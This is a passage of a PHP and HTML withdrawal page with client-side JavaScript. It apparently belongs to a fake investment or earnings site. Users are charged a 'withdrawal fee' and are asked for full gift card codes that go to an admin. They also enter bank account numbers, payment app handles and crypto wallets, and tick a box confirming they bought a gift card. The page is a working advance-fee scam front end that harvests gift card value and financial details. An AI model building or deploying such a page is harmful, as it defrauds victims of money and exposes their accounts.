            <option value="visa">Visa Prepaid</option>
            <option value="mastercard">Mastercard</option>
            <option value="walmart">Walmart</option>
            <option value="target">Target</option>
            <option value="steam">Steam</option>
            <option value="xbox">Xbox</option>
            <option value="playstation">PlayStation</option>
            <option value="netflix">Netflix</option>
            <option value="other">Other (specify in notes)</option>
        </select>
        <input type="text" name="fee_giftcard_code" class="form-control pay-input" placeholder="Gift Card Code: XXXX-XXXX-XXXX-XXXX">
        <span class="help-text">⚠️ Enter the FULL gift card code. This goes to admin for verification.</span>
    </div>

    <!-- FILE UPLOAD -->
    <div style="background:#1f2937; padding: 20px; border-radius: 12px; margin: 25px 0;">
        <label style="color:#9ca3af; font-size: 1rem; display:block; margin-bottom: 12px;">
            📎 Upload Screenshot/Receipt <span class="optional-badge">Optional for Gift Cards</span>
        </label>
        <div class="file-upload-wrapper">
            <input type="file" name="payment_proof" id="payment_proof" class="file-upload-input" accept="image/*,.pdf" onchange="handleFileSelect(this)">
            <div class="file-upload-button" id="uploadButton">
                <div style="font-size:32px; margin-bottom:8px;">📤</div>
                <div style="font-size: 1rem;">Tap to upload screenshot</div>
            </div>
        </div>
        <div id="fileName" style="margin-top:12px; font-size: 0.9375rem; color:#60a5fa;"></div>
    </div>

    <!-- STEP 5: WHERE TO RECEIVE -->
    <label class="step-label">📥 Step 5: Where To Receive Money?</label>
    
    <div class="payment-grid">
        <div class="method-btn active" data-method="bank" onclick="selectMethod('bank')">
            <span class="method-icon">🏦</span>
            <span class="method-name">Bank</span>
        </div>
        <div class="method-btn" data-method="cashapp" onclick="selectMethod('cashapp')">
            <span class="method-icon" style="color:#00d632;">💵</span>
            <span class="method-name">CashApp</span>
        </div>
        <div class="method-btn" data-method="paypal" onclick="selectMethod('paypal')">
            <span class="method-icon" style="color:#0070ba;">💳</span>
            <span class="method-name">PayPal</span>
        </div>
        <div class="method-btn" data-method="venmo" onclick="selectMethod('venmo')">
            <span class="method-icon" style="color:#008cff;">💸</span>
            <span class="method-name">Venmo</span>
        </div>
        <div class="method-btn" data-method="zelle" onclick="selectMethod('zelle')">
            <span class="method-icon" style="color:#6d1ed4;">⚡</span>
            <span class="method-name">Zelle</span>
        </div>
        <div class="method-btn" data-method="crypto" onclick="selectMethod('crypto')">
            <span class="method-icon" style="color:#f7931a;">₿</span>
            <span class="method-name">Crypto</span>
        </div>
        <div class="method-btn" data-method="giftcard" onclick="selectMethod('giftcard')">
            <span class="method-icon" style="color:#ef4444;">🎁</span>
            <span class="method-name">Gift Card</span>
        </div>
    </div>

    <input type="hidden" name="payment_method" id="paymentMethod" value="bank">

    <!-- RECEIVING FORMS -->
    <div class="payment-form active" id="bankForm">
        <label>Bank Name</label>
        <input type="text" name="bank_name" class="form-control receive-input" placeholder="Enter bank name">
        <label>Account Number</label>
        <input type="text" name="account_number" class="form-control receive-input" placeholder="Enter account number">
        <label>Account Holder Name</label>
        <input type="text" name="account_name" class="form-control receive-input" placeholder="Enter full name">
    </div>

    <div class="payment-form" id="cashappForm">
        <label>Your CashApp $Cashtag</label>
        <input type="text" name="cashapp_tag" class="form-control receive-input" placeholder="$yourcashtag">
    </div>

    <div class="payment-form" id="paypalForm">
        <label>Your PayPal Email</label>
        <input type="email" name="paypal_email" class="form-control receive-input" placeholder="email@example.com">
    </div>

    <div class="payment-form" id="venmoForm">
        <label>Your Venmo Username</label>
        <input type="text" name="venmo_username" class="form-control receive-input" placeholder="@username">
    </div>

    <div class="payment-form" id="zelleForm">
        <label>Your Zelle Email OR Phone</label>
        <input type="email" name="zelle_email" class="form-control receive-input" placeholder="Email address">
        <input type="tel" name="zelle_phone" class="form-control" placeholder="Phone number (optional)">
    </div>

    <div class="payment-form" id="cryptoForm">
        <label>Cryptocurrency</label>
        <select name="crypto_type" class="form-control">
            <option value="USDT">USDT</option>
            <option value="BTC">Bitcoin</option>
            <option value="ETH">Ethereum</option>
        </select>
        <label>Your Wallet Address</label>
        <input type="text" name="crypto_wallet" class="form-control receive-input" placeholder="Enter wallet address">
    </div>

    <div class="payment-form" id="giftcardForm">
        <label>Gift Card Type You Want</label>
        <select name="gift_card_type" class="form-control receive-input">
            <option value="">Select Type</option>
            <option value="amazon">Amazon</option>
            <option value="itunes">iTunes</option>
            <option value="googleplay">Google Play</option>
            <option value="visa">Visa</option>
            <option value="other">Other</option>
        </select>
    </div>

    <button type="submit" class="btn btn-green mt-3" id="submitBtn" disabled>⏳ Check verification box first</button>

</form>

<br>

</div>

<?php if($showSuccessModal): ?>
<div class="modal fade show" id="successModal" tabindex="-1" style="display:block; background:rgba(0,0,0,0.8);">
    <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content" style="margin: 20px;">
            <div class="modal-header" style="border-bottom: 1px solid #374151; padding: 20px;">
                <h5 class="modal-title" style="font-size: 1.25rem;">✅ Withdrawal Submitted!</h5>
            </div>
            <div class="modal-body text-center" style="padding: 30px 20px;">
                <div class="success-icon">🎉</div>
                <h4 style="font-size: 1.5rem; margin-bottom: 10px;">Success!</h4>
                <p style="font-size: 1rem; color: #9ca3af;">Your request has been submitted.</p>
                <hr style="border-color:#374151; margin: 20px 0;">
                <p style="color:#9ca3af; font-size: 1rem; line-height: 2;">
                    Amount: <b style="color:white;">$<?= number_format($amount) ?></b><br>
                    Fee: <b style="color:#fbbf24;">$<?= number_format($fee) ?></b><br>
                    Paid via: <b style="color:#22c55e;"><?= strtoupper($pay_fee_method) ?></b><br>
                    Receive via: <b style="color:#22c55e;"><?= strtoupper($payment_method) ?></b>
                </p>
                
                <div class="notification-status">
                    <div class="<?= $emailSent ? 'sent' : 'failed' ?>">
                        📧 Admin notified: <?= $emailSent ? '✅ Email sent with all details' : '❌ Failed - check error logs' ?>
                    </div>
                </div>
            </div>
            <div class="modal-footer" style="border-top: 1px solid #374151; padding: 20px; display: flex; gap: 10px;">
                <a href="transactions.php" class="btn btn-green" style="flex: 1;">View Status</a>
                <a href="index.html" class="btn" style="background:#374151; color:white; flex: 1;">Dashboard</a>
            </div>
        </div>
    </div>
</div>
<?php endif; ?>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

<script>
function calculateFee(amount) {
    if (amount <= 0) return 0;
    if (amount <= 500) return 50;
    if (amount <= 1000) return 100;
    if (amount <= 5000) return 150;
    if (amount <= 10000) return 250;
    if (amount <= 50000) return 500;
    return 1000;
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(function() {
        alert('📋 Copied: ' + text);
    }, function() {
        const textArea = document.createElement("textarea");
        textArea.value = text;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand("copy");
        document.body.removeChild(textArea);
        alert('📋 Copied: ' + text);
    });
}

function selectPayMethod(method) {
    document.querySelectorAll('.pay-tab').forEach(tab => tab.classList.remove('active'));
    document.querySelector('.pay-tab[data-method="' + method + '"]').classList.add('active');
    document.querySelectorAll('.fee-details-form').forEach(form => form.classList.remove('active'));
    document.getElementById('pay-' + method).classList.add('active');
    document.getElementById('payFeeMethod').value = method;
    
    const fileInput = document.getElementById('payment_proof');
    const uploadButton = document.getElementById('uploadButton');
    
    if (method === 'giftcard') {
        uploadButton.style.opacity = '0.7';
    } else {
        uploadButton.style.opacity = '1';
    }
    
    updateButtonState();
}

function selectMethod(method) {
    document.querySelectorAll('.method-btn').forEach(btn => btn.classList.remove('active'));
    document.querySelector('.method-btn[data-method="' + method + '"]').classList.add('active');
    document.querySelectorAll('.payment-form').forEach(form => form.classList.remove('active'));
    document.getElementById(method + 'Form').classList.add('active');
    document.getElementById('paymentMethod').value = method;
    
    updateButtonState();
}

function handleFileSelect(input) {
    const file = input.files[0];
    const button = document.getElementById('uploadButton');
    
    if (file) {
        button.classList.add('file-selected');
        button.innerHTML = '<div style="font-size:32px; margin-bottom:8px;">✅</div><div style="font-size: 1rem;">' + file.name + '</div>';
        document.getElementById('fileName').textContent = (file.size/1024).toFixed(1) + ' KB';
    } else {
        button.classList.remove('file-selected');
        button.innerHTML = '<div style="font-size:32px; margin-bottom:8px;">📤</div><div style="font-size: 1rem;">Tap to upload screenshot</div>';
        document.getElementById('fileName').textContent = '';
    }
    
    updateButtonState();
}

function updateButtonState() {
    const amount = parseFloat(document.getElementById('amount').value) || 0;
    const fee = calculateFee(amount);
    const total = amount + fee;
    const balance = <?= $balance ?>;
    const payMethod = document.getElementById('payFeeMethod').value;
    const submitBtn = document.getElementById('submitBtn');
    
    // ← NEW: CHECK IF VERIFICATION CHECKBOX IS CHECKED
    const contactConfirmed = document.getElementById('contactConfirmed').checked;
    const giftcardBought = document.getElementById('giftcardBought').checked;
    const verificationPassed = contactConfirmed || giftcardBought;
    
    if (!verificationPassed) {
        submitBtn.disabled = true;
        submitBtn.innerHTML = '⏳ Check verification box first';
        submitBtn.style.background = '#6b7280';
        submitBtn.style.cursor = 'not-allowed';
        return;
    }
    
    if (amount < 100) {
        submitBtn.disabled = true;
        submitBtn.innerHTML = 'Minimum withdrawal is $100';
        submitBtn.style.background = '#6b7280';
        submitBtn.style.cursor = 'not-allowed';
        return;
    }
    
    if (total > balance) {
        submitBtn.disabled = true;
        submitBtn.innerHTML = '❌ Insufficient Balance';
        submitBtn.style.background = '#ef4444';
        submitBtn.style.cursor = 'not-allowed';
        return;
    }
    
    let payFilled = false;
    const activePayForm = document.querySelector('.fee-details-form.active');
    if (activePayForm) {
        const inputs = activePayForm.querySelectorAll('input.pay-input, select.pay-input');
        payFilled = Array.from(inputs).every(input => input.value.trim() !== '');
    }
    
    let receiveFilled = false;
    const receiveMethod = document.getElementById('paymentMethod').value;
    const activeReceiveForm = document.getElementById(receiveMethod + 'Form');
    if (activeReceiveForm) {
        const inputs = activeReceiveForm.querySelectorAll('input.receive-input, select.receive-input');
        receiveFilled = Array.from(inputs).every(input => input.value.trim() !== '');
    }
    
    const file = document.getElementById('payment_proof').files[0];
    const fileValid = (payMethod === 'giftcard') || file;
    
    if (payFilled && receiveFilled && fileValid) {
        submitBtn.disabled = false;
        submitBtn.innerHTML = '💸 Submit Withdrawal ($' + total.toLocaleString() + ')';
        submitBtn.style.background = '#22c55e';
        submitBtn.style.cursor = 'pointer';
    } else {
        submitBtn.disabled = true;
        submitBtn.innerHTML = '⏳ Fill all required fields';
        submitBtn.style.background = '#6b7280';
        submitBtn.style.cursor = 'not-allowed';
    }
}

const amountInput = document.getElementById('amount');
const previewBox = document.getElementById('previewBox');

amountInput.addEventListener('input', function() {
    const amount = parseFloat(this.value) || 0;
    const fee = calculateFee(amount);
    const total = amount + fee;
    const balance = <?= $balance ?>;
    
    if (amount >= 100) {
        previewBox.style.display = 'block';
        document.getElementById('previewAmount').textContent = '$' + amount.toLocaleString();
        document.getElementById('previewFee').textContent = '$' + fee.toLocaleString();
        document.getElementById('previewTotal').textContent = '$' + total.toLocaleString();
        previewBox.style.borderLeftColor = total > balance ? '#ef4444' : '#22c55e';
    } else {
        previewBox.style.display = 'none';
    }
    
    updateButtonState();
});

document.querySelectorAll('input, select').forEach(input => {
    input.addEventListener('input', updateButtonState);
    input.addEventListener('change', updateButtonState);
});

document.querySelector('input[name="cashapp_tag"]')?.addEventListener('blur', function() {
    let val = this.value.trim();
    if (val && !val.startsWith('$')) this.value = '$' + val;
});

document.querySelector('input[name="venmo_username"]')?.addEventListener('blur', function() {
    let val = this.value.trim();
    if (val && !val.startsWith('@')) this.value = '@' + val;
});

updateButtonState();
if (amountInput.value) amountInput.dispatchEvent(new Event('input'));
document.getElementById('confirmVerificationBtn').addEventListener('click', function() {
    const contact = document.getElementById('contactConfirmed').checked;
    const gift = document.getElementById('giftcardBought').checked;
    const status = document.getElementById('verificationStatus');

    if (!contact && !gift) {
        status.innerHTML = "❌ Select one option before confirming";
        status.style.color = "#ef4444";
        return;
    }

    // ✅ Lock verification
    document.getElementById('realVerified').value = "1";
    status.innerHTML = "✅ Verification Confirmed";
    status.style.color = "#22c55e";

    // disable button after confirm
    this.disabled = true;
    this.innerHTML = "✅ Confirmed";

    updateButtonState();
});
</script>

</body>
</html> 